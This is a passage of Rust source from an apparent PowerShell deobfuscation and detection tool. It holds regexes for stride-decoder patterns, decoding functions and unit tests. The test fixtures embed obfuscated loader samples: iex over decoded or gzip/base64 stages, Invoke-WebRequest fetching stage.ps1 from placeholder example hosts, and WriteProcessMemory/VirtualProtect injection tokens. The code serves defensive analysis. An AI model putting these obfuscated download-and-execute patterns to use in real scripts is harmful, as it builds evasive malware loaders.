            out.push(ch);
        }
    }
    if escaped {
        out.push('\\');
    }
    out
}

#[allow(clippy::expect_used)]
static SKIP_NTH_FOR_SUBSTRING_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{[^{}]*?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]*?;\s*\$(\w+)\s*\+=\s*(\d+)\s*\)\s*\{[^{}]*?\.\s*'su'\s*\.\s*'Invoke'\s*\(\s*\$(\w+)\s*,"#,
    )
    .expect("skip-nth for substring def")
});

// Musculos-style `do { $acc += $param[$idx]; $idx += STEP } until (!$param[$idx])`
// stride decoder. Same call shape as SKIP_NTH_FOR_SUBSTRING (NAME 'carrier'), but
// the function body uses do/until instead of for. Captures: 1=function name,
// 2=index-var (init), 3=start, 4=index-var (increment) — must equal 2,
// 5=step.
#[allow(clippy::expect_used)]
static MUSCULOS_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{\s*\$(\w+)\s*=\s*(\d+)\s*;\s*do\s*\{[^{}]*?\$\w+\s*\+=\s*\$\w+\[\s*\$\w+\s*\][^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}\s*until\s*\(\s*!\s*\$\w+\[\s*\$\w+\s*\]\s*\)"#,
    )
    .expect("musculos stride def")
});

// For-loop stride decoders that append direct index reads:
// `for($i=4; $i -lt $s.Length; $i+=5) { $out += $s[$i] }`.
#[allow(clippy::expect_used)]
static FOR_INDEX_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\(\s*\$(\w+)[^)]*\)\s*\{.{0,4096}?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]{0,1024}?;\s*\$(\w+)\s*\+=\s*(\d+)\s*\)\s*\{.{0,2048}?\$\w+\s*\+=\s*\$(\w+)\s*\[\s*\$(\w+)\s*\]"#,
    )
    .expect("for index stride def")
});

// For-loop stride decoders that call Substring through a literal or variable:
// `$out += $s.$method.Invoke($i, 1)`.
#[allow(clippy::expect_used)]
static FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\(\s*\$(\w+)[^)]*\)\s*\{.{0,4096}?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]{0,1024}?;\s*\$(\w+)\s*\+=\s*\(?\s*(\d+)\s*\)?\s*\)\s*\{.{0,2048}?\$\w+\s*\+=\s*\$(\w+)\s*\.\s*(?:'([^']+)'|\$([A-Za-z_][A-Za-z0-9_]*))\s*\.Invoke\s*\(\s*\$(\w+)\s*,"#,
    )
    .expect("for substring invoke stride def")
});

#[allow(clippy::expect_used)]
static DO_WHILE_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)[^)]*\)\s*\{[^{}]*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;\r\n{}]{1,128})[;\r\n]+[^{}]*?do\s*\{[^{}]*?\$\w+\s*\+=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\][^{}]*?\$([A-Za-z_][A-Za-z0-9_]*)\s*\+=\s*(\d+)[^{}]*?\}\s*(?:until\s*\(\s*!\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]\s*\)|while\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]\s*\))"#,
    )
    .expect("do/while stride def")
});

fn contains_skip_nth_for_substring_shape(text: &str) -> bool {
    if !contains_ascii_case_insensitive(text, "for(")
        && !contains_ascii_case_insensitive(text, "do")
    {
        return false;
    }
    contains_ascii_case_insensitive(text, "invoke")
        || contains_ascii_case_insensitive(text, "[$")
        || contains_ascii_case_insensitive(text, "until(")
        || contains_ascii_case_insensitive(text, "while")
}

fn looks_like_dense_skip_nth_payload(text: &str) -> bool {
    if text.len() < 1024 || !has_stride_decoder_definition_atom(text) {
        return false;
    }
    let lower = text.to_ascii_lowercase();
    (lower.contains("do{") || lower.contains("do {"))
        && lower.contains("until")
        && lower.contains("+=")
        && lower.matches(");").count() >= 8
}

fn looks_like_for_substring_stride_payload(text: &str) -> bool {
    if text.len() < 1024 || !has_stride_decoder_definition_atom(text) {
        return false;
    }
    let has_for_stride_loop = contains_ascii_case_insensitive(text, "for(")
        || contains_ascii_case_insensitive(text, "for (");
    if !has_for_stride_loop || !contains_ascii_case_insensitive(text, "+=") {
        return false;
    }
    contains_ascii_case_insensitive(text, "invoke")
        || (text.contains("[$") && FOR_INDEX_STRIDE_DEF_RE.is_match(text))
}

fn has_stride_decoder_definition_atom(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "function")
        || contains_ascii_case_insensitive(text, "-n ")
        || contains_ascii_case_insensitive(text, "-name ")
}

fn expand_skip_nth(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        && !contains_ascii_case_insensitive(text, "-n")
        && !contains_ascii_case_insensitive(text, "-name")
    {
        return text.to_string();
    }
    let mut out = text.to_string();
    // Collect all function definitions with their skip parameters
    let defs: Vec<(String, usize, usize)> = SKIP_NTH_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            // fn name: group 1 (function NAME) or group 2 (-n NAME)
            let fn_name = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            // body: group 3
            let body = caps.get(3)?.as_str();
            // step: group 5 (the $idx += N value)
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if step == 0 || step > 10 {
                return None;
            }
            // Find start index: look for $VAR = N initializer in the body
            // The init variable should match the step variable (group 4)
            let idx_var = caps.get(4)?.as_str();
            let start: usize = SKIP_NTH_INIT_RE
                .captures_iter(body)
                .find(|c| c.get(1).map(|m| m.as_str()) == Some(idx_var))
                .and_then(|c| c.get(2)?.as_str().parse().ok())
                .unwrap_or(1);
            if start > 10 {
                return None;
            }
            Some((fn_name, start, step))
        })
        .collect();

    for (name, start, step) in defs {
        // Find call sites: NAME 'carrier' / NAME "carrier" / NAME('carrier')
        // / NAME ( "carrier" ). The leading `(?:^|[^\w])` is a manual word
        // boundary that prevents `BarFoo('x')` from matching when the
        // function name is `Foo` — `\b` alone would happily anchor at the
        // `F` inside `BarFoo`. Carrier minimum length 4: at start≥1 step≥1
        // a 1-3 char carrier almost never decodes to a meaningful token,
        // and lower limits invited false rewrites on unrelated literals.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{4,2048}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                // The `(?:^|[^\w])` prefix consumes a delimiter char (when
                // not at line start) that's NOT part of the call we want to
                // rewrite. Keep that char in the output so the surrounding
                // token / line structure isn't damaged.
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];

                let decoded = decode_strided_carrier(carrier, start, step);
                if decoded.is_empty() {
                    return None;
                }
                let replacement = format!("{}'{}'", prefix, decoded.replace('\'', ""));
                Some((full.start(), full.end(), replacement))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }
    out
}

#[cfg(test)]
mod skip_nth_prefilter_tests {
    use super::{
        expand_for_substring_stride_fast_path_payload, expand_skip_nth,
        large_ps1_report_sample_needs_normalization, looks_like_for_substring_stride_payload,
        normalize_ps1_payload_for_report_until,
    };

    #[test]
    fn ignores_text_without_skip_nth_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_skip_nth(text), text);
    }

    #[test]
    fn dense_skip_nth_report_normalization_uses_fast_path() {
        fn carrier(decoded: &str) -> String {
            decoded.chars().flat_map(|ch| ['x', 'x', ch]).collect()
        }

        let mut text = String::from(
            "function Decode($s){$i=2;do{$o+=$s[$i];Format-List;$i+=3}until(!$s[$i])$o}",
        );
        for _ in 0..10 {
            text.push_str(";IEX (Decode '");
            text.push_str(&carrier("Invoke-WebRequest https://fast.example/p"));
            text.push_str("')");
        }

        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(text.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("https://fast.example/p"),
            "{normalized}"
        );
    }

    #[test]
    fn dense_do_until_stride_report_normalization_decodes_variable_carrier() {
        let mut text = String::from(
            "$vibr='~~~[~~~n.~~E~~~T ~~. ~~s~~~e ~~R~,~V~~~I ~~C~~~E~';\
             function Ekser ($gerlin) {$ashrames=3;\
             do {$unde+=$gerlin[$ashrames];$ashrames+=4;$x=Compare-Object a b}\
             until (!$gerlin[$ashrames])$unde};",
        );
        for _ in 0..60 {
            text.push_str("Rockl (Ekser $vibr);");
        }

        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(text.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("'[nET.seRVICE'"),
            "dense report normalization did not rewrite variable carrier:\n{normalized}"
        );
    }

    #[test]
    fn direct_index_for_stride_payload_uses_fast_path_gate_without_literal_invoke() {
        fn carrier(decoded: &str) -> String {
            decoded
                .chars()
                .flat_map(|ch| ['x', 'x', 'x', 'x', ch])
                .collect()
        }

        let decoded = "Invoke-WebRequest https://stride-fast.example/p -OutFile out.bin";
        let encoded = carrier(decoded);
        let mut text = String::from(
            "function Decode($s){for($i=4;$i -lt $s.Length;$i+=5){$out+=$s[$i];$noise='x'}$out};",
        );
        for _ in 0..18 {
            text.push_str("Run (Decode '");
            text.push_str(&encoded);
            text.push_str("');");
        }

        assert!(
            looks_like_for_substring_stride_payload(&text),
            "direct index stride decoder should be eligible for the fast path"
        );

        let expanded = expand_for_substring_stride_fast_path_payload(&text);
        assert!(
            expanded.contains("https://stride-fast.example/p"),
            "fast path did not decode direct index-stride carriers:\n{expanded}"
        );
    }

    #[test]
    fn report_fast_path_decodes_appended_substring_method_stride() {
        fn carrier(decoded: &str, start: usize, step: usize) -> String {
            let len = start + decoded.chars().count() * step;
            let mut chars = vec!['x'; len];
            for (idx, c) in decoded.chars().enumerate() {
                chars[start + idx * step] = c;
            }
            chars.into_iter().collect()
        }

        let decoded =
            "Invoke-WebRequest https://report-stride.example/stage.ps1 -OutFile stage.ps1";
        let carrier = carrier(decoded, 4, 5);
        let ps = format!(
            "$method='S';$method+='ubstrin';$method+='g';\
             function Decode($s){{for($i=4;$i -lt $s.Length;$i+=(5)){{$out+=$s.$method.Invoke($i,1);}}$out}};\
             $url=Decode '{carrier}';\
             $pad='{pad}'",
            pad = "x".repeat(1024)
        );

        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(ps.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("https://report-stride.example/stage.ps1"),
            "report fast path did not decode appended method stride:\n{normalized}"
        );
    }

    #[test]
    fn report_fast_path_decodes_concat_substring_method_stride() {
        fn carrier(decoded: &str, start: usize, step: usize) -> String {
            let len = start + decoded.chars().count() * step;
            let mut chars = vec!['x'; len];
            for (idx, c) in decoded.chars().enumerate() {
                chars[start + idx * step] = c;
            }
            chars.into_iter().collect()
        }

        let decoded = "Invoke-WebRequest http://report-stride.example/next.ps1";
        let carrier = carrier(decoded, 5, 6);
        let ps = format!(
            "$prefix='S';$suffix='ring';$method=$prefix+'ubst'+$suffix;\
             function Decode($s){{for($i=5;$i -lt $s.Length;$i+=6){{$out+=$s.$method.Invoke($i,1);}}$out}};\
             Decode '{carrier}';\
             $pad='{pad}'",
            pad = "x".repeat(1024)
        );

        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(ps.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("http://report-stride.example/next.ps1"),
            "report fast path did not decode concat method stride:\n{normalized}"
        );
    }

    #[test]
    fn near_threshold_large_base64_ps1_report_normalization_is_sampled() {
        let mut text = String::from("$combinedData = [Convert]::FromBase64String(\"");
        text.push_str(&"A".repeat(112 * 1024));
        text.push_str(
            r#"" )
$key = [System.Security.Cryptography.SHA256]::Create()
$plain = $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
[Kernel32]::WriteProcessMemory($proc, $addr, $plain, $plain.Length, [IntPtr]::Zero)
"#,
        );
        assert!(text.len() > 96 * 1024 && text.len() < 128 * 1024);

        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(text.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("omitted middle of large extracted PowerShell payload"),
            "near-threshold large PS1 payload was fully normalized instead of sampled"
        );
        assert!(normalized.contains("FromBase64String"));
        assert!(normalized.contains("WriteProcessMemory"));
    }

    #[test]
    fn large_gzip_function_stage_decodes_before_report_sampling(
    ) -> Result<(), Box<dyn std::error::Error>> {
        use base64::Engine;
        use std::io::Write;

        let mut filler = String::with_capacity(120 * 1024);
        let mut state = 0x1234_5678u32;
        for _ in 0..120 * 1024 {
            state = state.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
            filler.push((b'!' + (state % 90) as u8) as char);
        }
        let decoded = format!(
            "Invoke-WebRequest -Uri https://large-gzip-stage.example/stage.ps1\r\n\
             $noise = '{filler}'\r\n\
             Add-Type '[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect();'\r\n"
        );
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder.write_all(decoded.as_bytes())?;
        let gz = encoder.finish()?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
        assert!(
            b64.len() > 96 * 1024,
            "test fixture should force the large-report path"
        );
        let ps = format!(
            r#"
$blob = "{b64}"
function InflateBytes ([byte[]]$bytes) {{
    $inputStream = [IO.MemoryStream]::new($bytes)
    $gzipStream = [IO.Compression.GZipStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
    $outputStream = [IO.MemoryStream]::new()
    $gzipStream.CopyTo($outputStream)
    $outputStream.ToArray()
}}
$stage = [Text.Encoding]::UTF8.GetString((InflateBytes ([Convert]::FromBase64String($blob)))).TrimEnd("`0")
iex $stage
"#
        );

        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(ps.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("https://large-gzip-stage.example/stage.ps1"),
            "large gzip stage was not decoded before sampling:\n{normalized}"
        );
        assert!(
            normalized.contains("DllImport"),
            "tail of decoded stage was not preserved by sampling:\n{normalized}"
        );
        assert!(
            !normalized.contains("FromBase64String($blob)"),
            "report should not expose the compressed wrapper as the primary layer:\n{normalized}"
        );
        Ok(())
    }

    #[test]
    fn large_plain_loader_tokens_do_not_force_report_normalization() {
        let text = r#"
$computer = $env:COMPUTERNAME
$payload = [Convert]::FromBase64String("QUJDREVGR0g=")
[System.Environment]::GetEnvironmentVariable("TEMP")
Start-Sleep -Seconds 5
"#;

        assert!(
            !large_ps1_report_sample_needs_normalization(text),
            "plain loader/environment tokens should not require full PS normalization"
        );
    }

    #[test]
    fn large_plain_loader_base64_iex_substring_is_not_invoke_expression() {
        let text = r#"
$payload = [Convert]::FromBase64String("AAAiexAAAiexAAAiexAAA=")
[Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero)
"#;

        assert!(
            !large_ps1_report_sample_needs_normalization(text),
            "iex inside opaque data should not require full PS normalization"
        );
    }

    #[test]
    fn large_obfuscated_loader_tokens_still_force_report_normalization() {
        for text in [
            r#"$x = "AxxB" -replace "xx", "" "#,
            r#"$x = ([char]73)+([char]69)+([char]88)"#,
            r#"$x = $s.substring(1, 3)"#,
            r#"$x = "a","b" -join "" "#,
        ] {
            assert!(
                large_ps1_report_sample_needs_normalization(text),
                "obfuscated PS sample should require normalization: {text}"
            );
        }
    }
}

fn expand_skip_nth_for_substring(text: &str) -> String {
    if !contains_skip_nth_for_substring_shape(text) {
        return text.to_string();
    }
    let mut out = text.to_string();
    let mut defs: Vec<(String, usize, usize)> = SKIP_NTH_FOR_SUBSTRING_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str().to_string();
            let init_var = caps.get(2)?.as_str();
            let step_var = caps.get(4)?.as_str();
            let invoke_var = caps.get(6)?.as_str();
            if !init_var.eq_ignore_ascii_case(step_var)
                || !init_var.eq_ignore_ascii_case(invoke_var)
            {
                return None;
            }
            let start: usize = caps.get(3)?.as_str().parse().ok()?;
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if start > 10 || step == 0 || step > 10 {
                return None;
            }
            Some((name, start, step))
        })
        .collect();
    // Musculos-style do/until variants. Same (start, step) carrier semantics.
    defs.extend(MUSCULOS_DEF_RE.captures_iter(text).filter_map(|caps| {
        let name = caps.get(1)?.as_str().to_string();
        let init_var = caps.get(2)?.as_str();
        let inc_var = caps.get(4)?.as_str();
        if !init_var.eq_ignore_ascii_case(inc_var) {
            return None;
        }
        let start: usize = caps.get(3)?.as_str().parse().ok()?;
        let step: usize = caps.get(5)?.as_str().parse().ok()?;
        if start > 10 || step == 0 || step > 10 {
            return None;
        }
        Some((name, start, step))
    }));
    let integer_bindings = ps_integer_bindings(text);
    defs.extend(
        DO_WHILE_STRIDE_DEF_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let name = caps.get(1)?.as_str().to_string();
                let param_var = caps.get(2)?.as_str();
                let init_var = caps.get(3)?.as_str();
                let start_expr = caps.get(4)?.as_str();
                let source_var = caps.get(5)?.as_str();
                let index_ref_var = caps.get(6)?.as_str();
                let inc_var = caps.get(7)?.as_str();
                let step: usize = caps.get(8)?.as_str().parse().ok()?;
                let (cond_source_var, cond_index_var) =
                    if let (Some(source), Some(index)) = (caps.get(9), caps.get(10)) {
                        (source.as_str(), index.as_str())
                    } else {
                        (caps.get(11)?.as_str(), caps.get(12)?.as_str())
                    };
                if !param_var.eq_ignore_ascii_case(source_var)
                    || !param_var.eq_ignore_ascii_case(cond_source_var)
                    || !init_var.eq_ignore_ascii_case(index_ref_var)
                    || !init_var.eq_ignore_ascii_case(inc_var)
                    || !init_var.eq_ignore_ascii_case(cond_index_var)
                {
                    return None;
                }
                let start = resolve_ps_usize_expr(start_expr, &integer_bindings)?;
                if start > 512 || step == 0 || step > 32 {
                    return None;
                }
                Some((name, start, step))
            }),
    );
    let has_for_stride_loop = contains_ascii_case_insensitive(text, "for(")
        || contains_ascii_case_insensitive(text, "for (");
    if has_for_stride_loop {
        defs.extend(
            FOR_INDEX_STRIDE_DEF_RE
                .captures_iter(text)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str().to_string();
                    let param_var = caps.get(2)?.as_str();
                    let init_var = caps.get(3)?.as_str();
                    let inc_var = caps.get(5)?.as_str();
                    let body_param = caps.get(7)?.as_str();
                    let body_idx = caps.get(8)?.as_str();
                    if !init_var.eq_ignore_ascii_case(inc_var)
                        || !init_var.eq_ignore_ascii_case(body_idx)
                        || !param_var.eq_ignore_ascii_case(body_param)
                    {
                        return None;
                    }
                    let start: usize = caps.get(4)?.as_str().parse().ok()?;
                    let step: usize = caps.get(6)?.as_str().parse().ok()?;
                    if start > 10 || step == 0 || step > 10 {
                        return None;
                    }
                    Some((name, start, step))
                }),
        );
    }
    let bindings = ps_string_bindings(text);
    if has_for_stride_loop {
        defs.extend(
            FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE
                .captures_iter(text)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str().to_string();
                    let param_var = caps.get(2)?.as_str();
                    let init_var = caps.get(3)?.as_str();
                    let inc_var = caps.get(5)?.as_str();
                    let body_param = caps.get(7)?.as_str();
                    let body_idx = caps.get(10)?.as_str();
                    if !init_var.eq_ignore_ascii_case(inc_var)
                        || !init_var.eq_ignore_ascii_case(body_idx)
                        || !param_var.eq_ignore_ascii_case(body_param)
                    {
                        return None;
                    }
                    let method = caps.get(8).map(|m| m.as_str().to_string()).or_else(|| {
                        caps.get(9)
                            .and_then(|m| bindings.get(&m.as_str().to_ascii_lowercase()).cloned())
                    })?;
                    if !method.eq_ignore_ascii_case("substring") {
                        return None;
                    }
                    let start: usize = caps.get(4)?.as_str().parse().ok()?;
                    let step: usize = caps.get(6)?.as_str().parse().ok()?;
                    if start > 10 || step == 0 || step > 10 {
                        return None;
                    }
                    Some((name, start, step))
                }),
        );
    }

    let mut seen_defs = std::collections::HashSet::new();
    defs.retain(|(name, start, step)| seen_defs.insert((name.to_ascii_lowercase(), *start, *step)));

    for (name, start, step) in defs {
        // Accept both NAME 'carrier' and NAME('carrier') / NAME ( 'carrier' ).
        // Manual word boundary `(?:^|[^\w])` so `Foo` doesn't match inside
        // `MyFoo('xy')`. Carrier excludes `{` `}` to avoid greedily eating
        // body-literal braces from an unrelated PS function body.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{6,8192}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];
                let decoded = decode_strided_carrier(carrier, start, step);
                if decoded.len() < 3 {
                    return None;
                }
                Some((
                    full.start(),
                    full.end(),
                    format!("{}'{}'", prefix, decoded.replace('\'', "")),
                ))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }

        let var_call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(var_call_re) = regex::Regex::new(&var_call_re_str) else {
            continue;
        };
        let var_call_matches: Vec<(usize, usize, String)> = var_call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let var = cc.get(1)?.as_str().to_ascii_lowercase();
                let carrier = bindings.get(&var)?;
                if carrier.len() > 8192 {
                    return None;
                }
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];
                let decoded = decode_strided_carrier(carrier, start, step);
                if decoded.len() < 3 {
                    return None;
                }
                Some((
                    full.start(),
                    full.end(),
                    format!("{}'{}'", prefix, decoded.replace('\'', "")),
                ))
            })
            .collect();
        for (start_pos, end_pos, replacement) in var_call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }

    out
}

fn decode_strided_carrier(carrier: &str, start: usize, step: usize) -> String {
    if carrier.is_ascii() {
        let bytes = carrier.as_bytes();
        let mut out = String::with_capacity(carrier.len() / step + 1);
        let mut i = start;
        while i < bytes.len() {
            out.push(bytes[i] as char);
            i = i.checked_add(step).unwrap_or(bytes.len());
        }
        return out;
    }

    let chars: Vec<char> = carrier.chars().collect();
    let mut out = String::with_capacity(chars.len() / step + 1);
    let mut i = start;
    while i < chars.len() {
        out.push(chars[i]);
        i = i.checked_add(step).unwrap_or(chars.len());
    }
    out
}

#[cfg(test)]
mod skip_nth_for_substring_prefilter_tests {
    use super::expand_skip_nth_for_substring;

    #[test]
    fn ignores_text_without_for_substring_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_skip_nth_for_substring(text), text);
    }

    #[test]
    fn do_while_stride_extractor_with_constant_sum_start_is_rewritten() {
        let text = r#"$a=4;$b=55;function Pick ($value) {
  $i=$a+$b
  do {
    $out += $value[$i]
    $i += 5
  } while ($value[$i])
  $out
}
Pick 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxIxxxxnxxxxvxxxxoxxxxkxxxxexxxx-xxxxWxxxxexxxxbxxxxRxxxxexxxxqxxxxuxxxxexxxxsxxxxtxxxx xxxx-xxxxUxxxxrxxxxixxxx xxxxhxxxxtxxxxtxxxxpxxxxsxxxx:xxxx/xxxx/xxxxpxxxxsxxxx-xxxxsxxxxtxxxxrxxxxixxxxdxxxxexxxx-xxxxsxxxxuxxxxmxxxx.xxxxexxxxxxxxxaxxxxmxxxxpxxxxlxxxxexxxx/xxxxsxxxxtxxxxaxxxxgxxxxexxxx.xxxxpxxxxsxxxx1'"#;

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-stride-sum.example/stage.ps1'"),
            "constant-sum do/while stride call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn do_while_stride_extractor_with_sample_syntax_is_rewritten() {
        let text = "Powershell \"$preeditorially=4;$tungetalerens=55;helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x');function helligaanden ($pauver) { $legman8=$preeditorially+$tungetalerens;\tdo  {$mitraille+=$pauver[$legman8];$legman8+=5} while  ($pauver[$legman8])$mitraille}\"";

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("'[int]$tGwdF<WmzMVUQo; M! '"),
            "sample-syntax do/while stride call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn do_while_stride_extractor_call_inside_prior_function_is_rewritten() {
        let text = concat!(
            "$preeditorially=4;$tungetalerens=55;",
            "function serviettens ($x) {",
            "$haandhvende=helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x')",
            "};",
            "function helligaanden ($pauver) {",
            "$legman8=$preeditorially+$tungetalerens;",
            "do {$mitraille+=$pauver[$legman8];$legman8+=5} while ($pauver[$legman8])",
            "$mitraille",
            "};",
            "serviettens 'x'"
        );

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("'[int]$tGwdF<WmzMVUQo; M! '"),
            "do/while stride call inside prior function was not rewritten:\n{out}"
        );
    }

    #[test]
    fn do_while_stride_extractor_variable_carrier_is_rewritten() {
        let text = concat!(
            "$vibr='~~~[~~~n.~~E~~~T ~~. ~~s~~~e ~~R~,~V~~~I ~~C~~~E~';",
            "function Ekser ($gerlin) {",
            "$ashrames=3;",
            "do {$unde+=$gerlin[$ashrames];$ashrames+=4;$ashramesmmateria=Compare-Object x y}",
            "until (!$gerlin[$ashrames])$unde",
            "};",
            "$ynglefu=Ekser ' GGnGGGeGGGtGGG.G GW';",
            "Rockl (Ekser $vibr)"
        );

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("$ynglefu='net.W'"),
            "direct carrier call was not rewritten:\n{out}"
        );
        assert!(
            out.contains("Rockl ('[nET.seRVICE'"),
            "variable carrier call was not rewritten:\n{out}"
        );
    }
}

#[cfg(test)]
mod decode_strided_carrier_tests {
    use super::decode_strided_carrier;

    #[test]
    fn ascii_and_unicode_carriers_decode_the_same_way() {
        assert_eq!(decode_strided_carrier("a.b.c.d.e", 0, 2), "abcde");
        assert_eq!(decode_strided_carrier("a.β.c.δ.e", 0, 2), "aβcδe");
    }
}

// Matches `$NAME = @'\n...body...\n'@`. Captures: 1=var name, 2=body. The
// `'+` on each side accepts both the original form and the doubled-quote
// form that arises when the herestring is itself embedded inside a wrapping
// single-quoted PS literal (common after `[Convert]::FromBase64String('...')`
// inlining). The closing `'@` should be at column 0 in strict PS, but
// obfuscators often deviate, so we just require the marker pair.
#[allow(clippy::expect_used)]
static PS_HERESTRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)\$([A-Za-z_]\w*)\s*=\s*@'+\r?\n(.*?)\r?\n'+@"#).expect("ps herestring assign")
});

// `$DST = $SRC -replace 'NEEDLE', 'REPL'` — captures dst, src, needle, repl.
// Outer quote count is constrained to 1 or 2 so the matcher works both for
// the original form (`'a','b'`) and the doubled-quote form (`''a'','b''`)
// that arises when the chain is inlined inside a wrapping single-quoted PS
// literal. Inner pattern allows `''` as a single-quote escape but forbids
// `\n` so we never accidentally extend the match across a line.
#[allow(clippy::expect_used)]
static PS_VAR_REPLACE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_]\w*)\s*=\s*\$([A-Za-z_]\w*)\s*-replace\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}\s*,\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}"#,
    )
    .expect("ps var replace assign")
});

fn ps_deadline_expired(deadline: Option<std::time::Instant>) -> bool {
    deadline.is_some_and(|deadline| std::time::Instant::now() >= deadline)
}

/// Pre-pass over a PowerShell text: expand common obfuscation patterns so that
